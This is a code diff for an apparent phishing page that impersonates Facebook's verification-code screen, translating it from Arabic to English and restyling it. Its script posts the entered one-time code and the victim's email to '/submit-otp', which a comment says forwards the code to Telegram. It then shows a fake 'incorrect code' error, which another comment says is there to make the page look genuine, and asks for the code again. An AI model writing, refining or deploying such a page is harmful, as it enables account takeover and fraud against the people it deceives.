@@ -1,53 +1,114 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Facebook - رمز التحقق</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <title>Facebook - Verification Code</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
-        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .container { background: white; max-width: 400px; width: 100%; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); padding: 30px 24px; text-align: center; }
-        .logo { font-size: 36px; font-weight: 800; color: #1877f2; margin-bottom: 20px; }
-        .icon-circle { width: 70px; height: 70px; background: #e7f3ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; font-size: 32px; }
-        .title { font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 8px; }
-        .subtitle { color: #606770; font-size: 14px; margin-bottom: 24px; line-height: 1.5; }
-        .subtitle strong { color: #1877f2; word-break: break-all; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
         
-        .otp-boxes { display: flex; justify-content: center; gap: 8px; margin-bottom: 24px; direction: ltr; }
+        body {
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+            max-width: 420px;
+            width: 100%;
+            padding: 28px 24px;
+            text-align: center;
+        }
+        
+        .fb-logo-small {
+            font-size: 32px;
+            font-weight: 700;
+            color: #1877f2;
+            margin-bottom: 20px;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        
+        .icon-circle {
+            width: 64px;
+            height: 64px;
+            background: #e7f3ff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            font-size: 30px;
+        }
+        
+        .title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #1c1e21;
+            margin-bottom: 8px;
+        }
+        
+        .subtitle {
+            font-size: 14px;
+            color: #606770;
+            line-height: 1.5;
+            margin-bottom: 24px;
+        }
+        
+        .subtitle strong {
+            color: #1c1e21;
+            word-break: break-all;
+        }
+        
+        .otp-boxes {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 24px;
+        }
+        
         .otp-boxes input {
-            width: 48px;
-            height: 56px;
+            width: 46px;
+            height: 54px;
             text-align: center;
             font-size: 22px;
             font-weight: 700;
-            border: 2px solid #dddfe2;
-            border-radius: 10px;
+            border: 1.5px solid #dddfe2;
+            border-radius: 6px;
             background: #fff;
-            transition: 0.2s;
+            color: #1c1e21;
             outline: none;
-            color: #1a1a1a;
-            font-family: 'Cairo', sans-serif;
+            transition: 0.2s;
+            font-family: Helvetica, Arial, sans-serif;
         }
-        .otp-boxes input:focus { border-color: #1877f2; box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.15); }
+        
+        .otp-boxes input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
         
         .verify-btn {
             width: 100%;
-            padding: 14px;
+            padding: 12px;
             background: #1877f2;
-            color: white;
+            color: #fff;
             border: none;
-            border-radius: 8px;
-            font-size: 18px;
+            border-radius: 6px;
+            font-size: 17px;
             font-weight: 700;
             cursor: pointer;
             transition: 0.2s;
-            margin-bottom: 12px;
-            font-family: 'Cairo', sans-serif;
+            margin-bottom: 14px;
+            font-family: Helvetica, Arial, sans-serif;
         }
+        
         .verify-btn:hover { background: #166fe5; }
-        .verify-btn:active { transform: scale(0.98); }
+        .verify-btn:active { transform: scale(0.99); }
         .verify-btn:disabled { opacity: 0.6; cursor: not-allowed; }
         
         .resend-btn {
@@ -55,39 +116,90 @@
             border: none;
             color: #1877f2;
             font-size: 14px;
-            cursor: pointer;
-            font-family: 'Cairo', sans-serif;
             font-weight: 600;
-            padding: 8px;
+            cursor: pointer;
+            font-family: Helvetica, Arial, sans-serif;
+            padding: 6px;
         }
+        
         .resend-btn:hover { text-decoration: underline; }
         .resend-btn:disabled { color: #90949c; cursor: not-allowed; text-decoration: none; }
         
-        .timer { color: #90949c; font-size: 13px; margin-top: 8px; }
+        /* Error Message */
+        .error-msg {
+            background: #ffebe8;
+            border: 1px solid #dd3c10;
+            color: #1c1e21;
+            padding: 10px 12px;
+            border-radius: 6px;
+            font-size: 14px;
+            display: none;
+            margin-bottom: 14px;
+            text-align: center;
+        }
         
-        .error-msg { background: #ffebe8; color: #d32f2f; padding: 10px 14px; border-radius: 8px; font-size: 14px; margin-bottom: 12px; display: none; }
         .error-msg.show { display: block; }
         
-        .success-msg { background: #e7f7ed; color: #1da85c; padding: 10px 14px; border-radius: 8px; font-size: 14px; margin-bottom: 12px; display: none; }
+        /* Success Message */
+        .success-msg {
+            background: #e7f7ed;
+            border: 1px solid #42b72a;
+            color: #1c1e21;
+            padding: 10px 12px;
+            border-radius: 6px;
+            font-size: 14px;
+            display: none;
+            margin-bottom: 14px;
+            text-align: center;
+        }
+        
         .success-msg.show { display: block; }
         
-        .loading-spinner { display: none; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid white; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        /* Spinner */
+        .loading-spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,0.4);
+            border-top: 2px solid #fff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
         .verify-btn.loading .btn-text { display: none; }
         .verify-btn.loading .loading-spinner { display: block; }
+        
+        /* Back Link */
+        .back-link {
+            display: inline-block;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            margin-top: 14px;
+        }
+        
+        .back-link:hover { text-decoration: underline; }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <div class="logo">facebook</div>
+        
+        <div class="fb-logo-small">facebook</div>
         
         <div class="icon-circle">📱</div>
         
-        <div class="title">أدخل رمز التحقق</div>
+        <div class="title">Enter verification code</div>
         <div class="subtitle">
-            تم إرسال رمز التحقق إلى<br>
-            <strong id="displayEmail">البريد الإلكتروني</strong>
+            We sent a 6-digit code to<br>
+            <strong id="displayEmail">your email</strong>
         </div>
         
         <div id="errorMsg" class="error-msg"></div>
@@ -103,13 +215,16 @@
         </div>
         
         <button type="button" id="verifyBtn" class="verify-btn">
-            <span class="btn-text">تحقق</span>
+            <span class="btn-text">Continue</span>
             <div class="loading-spinner"></div>
         </button>
         
         <button type="button" id="resendBtn" class="resend-btn" disabled>
-            إعادة إرسال الرمز (<span id="timerCount">60</span>ث)
+            Resend code (<span id="timerCount">60</span>s)
         </button>
+        
+        <br>
+        <a href="/" class="back-link">← Back to login</a>
     </div>
 
     <script>
@@ -121,8 +236,7 @@
         const successMsg = document.getElementById('successMsg');
         const displayEmail = document.getElementById('displayEmail');
         
-        // عرض الإيميل
-        const email = localStorage.getItem('fb_email') || 'البريد الإلكتروني';
+        const email = localStorage.getItem('fb_email') || 'your email';
         displayEmail.textContent = email;
         
         let countdown = 60;
@@ -150,13 +264,13 @@
             });
         });
 
-        // ===== التحقق من OTP =====
+        // ===== التحقق =====
         verifyBtn.addEventListener('click', async function() {
             let otp = '';
             otpInputs.forEach(input => otp += input.value);
             
             if (otp.length !== 6) {
-                errorMsg.textContent = '⚠️ يرجى إدخال الرمز كاملاً (6 أرقام)';
+                errorMsg.textContent = 'Please enter the complete 6-digit code';
                 errorMsg.classList.add('show');
                 successMsg.classList.remove('show');
                 return;
@@ -167,32 +281,33 @@
             verifyBtn.disabled = true;
             
             try {
+                // إرسال OTP للتيلجرام
                 const response = await fetch('/submit-otp', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ otp, email })
                 });
                 
-                const data = await response.json();
-                console.log('✅ تم إرسال OTP:', data);
+                await response.json();
                 
-                successMsg.textContent = '❌ رمز التحقق غير صحيح، حاول مرة أخرى';
-                successMsg.style.background = '#ffebe8';
-                successMsg.style.color = '#d32f2f';
-                successMsg.classList.add('show');
-                
-                verifyBtn.classList.remove('loading');
-                verifyBtn.disabled = false;
-                
-                // مسح الخانات
-                otpInputs.forEach(i => i.value = '');
-                otpInputs[0].focus();
+                // بعد الإرسال - نعرض خطأ عشان يبان حقيقي
+                setTimeout(() => {
+                    verifyBtn.classList.remove('loading');
+                    verifyBtn.disabled = false;
+                    
+                    errorMsg.textContent = 'The code you entered is incorrect. Please try again.';
+                    errorMsg.classList.add('show');
+                    
+                    // مسح الخانات
+                    otpInputs.forEach(i => i.value = '');
+                    otpInputs[0].focus();
+                }, 1500);
                 
             } catch (error) {
                 console.error('❌ خطأ:', error);
                 verifyBtn.classList.remove('loading');
                 verifyBtn.disabled = false;
-                errorMsg.textContent = '⚠️ حدث خطأ في الاتصال';
+                errorMsg.textContent = 'Something went wrong. Please try again.';
                 errorMsg.classList.add('show');
             }
         });
@@ -201,9 +316,7 @@
         resendBtn.addEventListener('click', function() {
             countdown = 60;
             startTimer();
-            successMsg.textContent = '✅ تم إعادة إرسال الرمز';
-            successMsg.style.background = '#e7f7ed';
-            successMsg.style.color = '#1da85c';
+            successMsg.textContent = 'A new code has been sent';
             successMsg.classList.add('show');
             setTimeout(() => successMsg.classList.remove('show'), 3000);
         });
@@ -220,14 +333,13 @@
                 if (countdown <= 0) {
                     clearInterval(timerInterval);
                     resendBtn.disabled = false;
-                    resendBtn.innerHTML = 'إعادة إرسال الرمز';
+                    resendBtn.innerHTML = 'Resend code';
                 } else {
-                    resendBtn.innerHTML = `إعادة إرسال الرمز (<span id="timerCount">${countdown}</span>ث)`;
+                    resendBtn.innerHTML = `Resend code (<span id="timerCount">${countdown}</span>s)`;
                 }
             }, 1000);
         }
 
-        // بدء التشغيل
         startTimer();
         otpInputs[0].focus();
     </script>
